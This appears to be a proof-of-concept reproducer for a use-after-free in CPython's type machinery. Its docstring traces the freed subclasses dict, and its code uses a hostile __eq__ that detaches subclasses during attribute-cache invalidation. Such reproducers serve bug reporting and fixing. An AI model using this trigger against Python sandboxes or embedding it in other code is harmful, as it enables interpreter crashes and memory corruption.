"""recurse_down_subclasses holds a borrowed tp_subclasses across PyDict_Contains.

Objects/typeobject.c:
  12369  PyObject *subclasses = lookup_tp_subclasses(type);  // borrowed ref
  12377  while (PyDict_Next(subclasses, &i, NULL, &ref))      // <- UAF read
  12386      int r = PyDict_Contains(dict, attr_name);        // runs user __eq__
                 -> Sub.__bases__ = (object,)
                    -> remove_subclass(Base, Sub)
                       -> PyDict_Size(subclasses)==0 -> clear_tp_subclasses(Base)
                          -> the dict `subclasses` still points at is freed
"""
armed = [False]


class Evil:
    def __hash__(self):
        return hash('__eq__')

    def __eq__(self, other):
        if armed[0]:
            armed[0] = False
            print("  evil __eq__ fired; detaching subclasses", flush=True)
            for s in subs:
                try:
                    s.__bases__ = (object,)
                except Exception as e:
                    print("   detach failed: %r" % (e,), flush=True)
            print("  Base.__subclasses__() = %r" % (Base.__subclasses__(),),
                  flush=True)
        return False


class Base:
    pass


subs = [type('S%d' % i, (Base,), {Evil(): 1}) for i in range(8)]
print("built %d subclasses" % len(subs), flush=True)

armed[0] = True
print("assigning Base.__eq__ ...", flush=True)
Base.__eq__ = lambda self, other: False
print("done", flush=True)
